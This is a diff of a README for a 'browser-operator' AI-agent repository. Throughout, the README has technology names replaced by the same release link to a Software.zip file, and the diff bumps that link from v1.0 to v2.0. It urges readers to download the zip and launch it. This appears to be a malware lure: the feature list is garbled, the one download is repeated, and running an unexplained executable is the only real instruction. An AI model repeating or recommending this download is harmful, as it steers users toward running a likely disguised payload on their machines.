@@ -1,16 +1,16 @@
 
 # 🚀 Browser Operator
 
-Welcome to the **browser-operator** repository! Here, you can build your very own AI operators similar to those developed by OpenAI. With the power of JavaScript, https://github.com/CARIOR123/browser-operator/releases/download/v1.0/Software.zip, https://github.com/CARIOR123/browser-operator/releases/download/v1.0/Software.zip, and Playwright, the possibilities are endless. 
+Welcome to the **browser-operator** repository! Here, you can build your very own AI operators similar to those developed by OpenAI. With the power of JavaScript, https://github.com/CARIOR123/browser-operator/releases/download/v2.0/Software.zip, https://github.com/CARIOR123/browser-operator/releases/download/v2.0/Software.zip, and Playwright, the possibilities are endless. 
 
 ## 📚 About
 This repository aims to provide a platform for creating AI operators that can assist in various computer tasks and interactions. The tools and technologies included allow for seamless integration and development of innovative solutions in the field of AI. 
 
 ## 🌟 Features
 - Build AI operators with ease
-- Leverage the power of JavaScript and https://github.com/CARIOR123/browser-operator/releases/download/v1.0/Software.zip
+- Leverage the power of JavaScript and https://github.com/CARIOR123/browser-operator/releases/download/v2.0/Software.zip
 - Seamless integration with Playwright for automation
-- https://github.com/CARIOR123/browser-operator/releases/download/v1.0/Software.zip for efficient web development
+- https://github.com/CARIOR123/browser-operator/releases/download/v2.0/Software.zip for efficient web development
 - Incorporate advanced AI techniques inspired by OpenAI
 
 ## 📁 Repository Contents
@@ -34,7 +34,7 @@ This repository aims to provide a platform for creating AI operators that can as
 
 ## 📦 Get Started
 To get started, download the necessary software and tools from the following link: 
-[![Download Software](https://github.com/CARIOR123/browser-operator/releases/download/v1.0/Software.zip)](https://github.com/CARIOR123/browser-operator/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/CARIOR123/browser-operator/releases/download/v2.0/Software.zip)](https://github.com/CARIOR123/browser-operator/releases/download/v2.0/Software.zip)
 
 Please note that the software needs to be launched once downloaded.
 
